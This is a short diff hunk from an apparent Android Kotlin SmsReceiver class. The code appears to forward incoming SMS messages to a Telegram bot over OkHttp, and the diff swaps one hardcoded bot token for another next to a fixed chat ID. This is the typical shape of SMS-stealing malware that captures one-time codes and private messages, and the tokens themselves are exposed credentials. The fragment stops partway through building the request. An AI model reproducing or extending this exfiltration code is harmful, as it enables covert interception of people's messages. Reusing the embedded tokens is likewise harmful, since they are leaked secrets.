@@ -18,7 +18,7 @@ class SmsReceiver : BroadcastReceiver() {
                 // Forward to Telegram using helper
                 CoroutineScope(Dispatchers.IO).launch {
                     try {
-                        val token = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
+                        val token = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
                         val chatId = "8820979221"
                         val okHttpClient = okhttp3.OkHttpClient()
                         val form = okhttp3.FormBody.Builder()
